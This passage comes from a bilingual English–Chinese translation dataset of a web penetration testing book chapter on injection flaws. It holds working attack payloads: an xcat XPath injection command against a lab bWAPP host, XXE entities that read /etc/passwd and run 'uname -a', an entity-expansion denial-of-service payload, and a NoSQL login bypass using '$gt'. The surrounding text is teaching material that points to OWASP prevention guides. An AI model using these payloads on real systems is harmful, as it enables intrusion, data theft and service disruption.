  type: TYPE_NORMAL
  zh: pip3 install xcat
- en: '[PRE35]'
  id: totrans-140
  prefs: []
  type: TYPE_PRE
  zh: '[PRE35]'
- en: xcat -m <http_method> -c "<cookie value>" <URL_without_parameters> <injecable_parameter>
    <parameter1=value> <parameter2=value> -t "<text_in_true_results>"
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: xcat -m <http_method> -c "<cookie value>" <URL_without_parameters> <injecable_parameter>
    <parameter1=value> <parameter2=value> -t "<text_in_true_results>"
- en: '[PRE36]'
  id: totrans-142
  prefs: []
  type: TYPE_PRE
  zh: '[PRE36]'
- en: xcat -m GET -c "PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F9867;security_level=0"
    http://10.7.7.5/bWAPP/xmli_2.php genre genre=horror action=search -t ">1<"
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: xcat -m GET -c "PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F9867;security_level=0"
    http://10.7.7.5/bWAPP/xmli_2.php genre genre=horror action=search -t ">1<"
- en: '[PRE37]'
  id: totrans-144
  prefs: []
  type: TYPE_PRE
  zh: '[PRE37]'
- en: <!DOCTYPE test [ <!ENTITY internal-entity "boss" >]>
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: <!DOCTYPE test [ <!ENTITY internal-entity "boss" >]>
- en: <reset><login>&internal-entity;</login><secret>Any bugs?</secret></reset>
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: <reset><login>&internal-entity;</login><secret>Any bugs?</secret></reset>
- en: '[PRE38]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE38]'
- en: <!DOCTYPE test [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: <!DOCTYPE test [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
- en: '[PRE39]'
  id: totrans-149
  prefs: []
  type: TYPE_PRE
  zh: '[PRE39]'
- en: <!DOCTYPE test [  <!ENTITY xxe SYSTEM "expect://uname -a" >]>
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: <!DOCTYPE test [  <!ENTITY xxe SYSTEM "expect://uname -a" >]>
- en: '[PRE40]'
  id: totrans-151
  prefs: []
  type: TYPE_PRE
  zh: '[PRE40]'
- en: <!DOCTYPE test [
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: <!DOCTYPE test [
- en: <!ENTITY entity0 "Level0-">
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: <!ENTITY entity0 "Level0-">
- en: <!ENTITY entity1 "Level1-&entity0;">
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: <!ENTITY entity1 "Level1-&entity0;">
- en: <!ENTITY entity2 "Level2-&entity1;&entity1;">
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: <!ENTITY entity2 "Level2-&entity1;&entity1;">
- en: <!ENTITY entity3 "Level3-&entity2;&entity2;&entity2;">
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: <!ENTITY entity3 "Level3-&entity2;&entity2;&entity2;">
- en: <!ENTITY entity4 "Level4-&entity3;&entity3;&entity3;&entity3;">
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: <!ENTITY entity4 "Level4-&entity3;&entity3;&entity3;&entity3;">
- en: <!ENTITY entity5 "Level5-&entity4;&entity4;&entity4;&entity4;&entity4;">
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: <!ENTITY entity5 "Level5-&entity4;&entity4;&entity4;&entity4;&entity4;">
- en: ']>'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: ']>'
- en: <reset><login>&entity0;</login><secret>Any bugs?</secret></reset>
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: <reset><login>&entity0;</login><secret>Any bugs?</secret></reset>
- en: '[PRE41]'
  id: totrans-161
  prefs: []
  type: TYPE_PRE
  zh: '[PRE41]'
- en: 'User.find({ username: req.body.username, password: req.body.password }, ...'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 'User.find({ username: req.body.username, password: req.body.password }, ...'
- en: '[PRE42]'
  id: totrans-163
  prefs: []
  type: TYPE_PRE
  zh: '[PRE42]'
- en: '{"username":"admin","password":{"$gt":""}}'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: '{"username":"admin","password":{"$gt":""}}'
- en: '[PRE43]'
  id: totrans-165
  prefs: []
  type: TYPE_PRE
  zh: '[PRE43]'
- en: $stmt = $dbh->prepare("SELECT * FROM REGISTRY where name LIKE '%?%'");
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: $stmt = $dbh->prepare("SELECT * FROM REGISTRY where name LIKE '%?%'");
- en: $stmt->execute(array($_GET['name']));
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: $stmt->execute(array($_GET['name']));
- en: '```'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: '```'
- en: 'Some useful references for this topic are as follows:'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 这个主题的一些有用参考资料如下：
- en: '[https://www.owasp.org/index.php/Data_Validation](https://www.owasp.org/index.php/Data_Validation)'
  id: totrans-170
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.owasp.org/index.php/Data_Validation](https://www.owasp.org/index.php/Data_Validation)'
- en: '[https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)'
  id: totrans-171
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)'
- en: '[https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)'
  id: totrans-172
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)'
- en: Summary
  id: totrans-173
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 概要
- en: In this chapter, we discussed various injection flaws. An injection flaw is
    a serious vulnerability in web applications, as the attacker can gain complete
    control over the server by exploiting it. We also examined how, through different
    types of injection, a malicious attacker can gain access to the operating system.
    This could then be used to attack other servers on the network. When attackers
    exploit a SQL injection flaw, they can access sensitive data on the backend database.
    This can prove to be devastating to an organization.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们讨论了各种注入漏洞。注入漏洞是Web应用程序中的严重漏洞，攻击者可以通过利用它来完全控制服务器。我们还研究了通过不同类型的注入，恶意攻击者可以访问操作系统。然后可以用来攻击网络上的其他服务器。当攻击者利用SQL注入漏洞时，他们可以访问后端数据库中的敏感数据。这对组织来说可能是灾难性的。
- en: In the next chapter we will get to know a particular type of injection vulnerability,
    Cross-Site Scripting, which allows attackers to change the way pages are presented
    to a user by injecting, or tricking the user into injecting, script code in request's
    parameters.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将了解一种特定类型的注入漏洞，即跨站脚本（Cross-Site Scripting），它允许攻击者通过在请求参数中注入或诱使用户注入脚本代码来改变页面向用户呈现的方式。
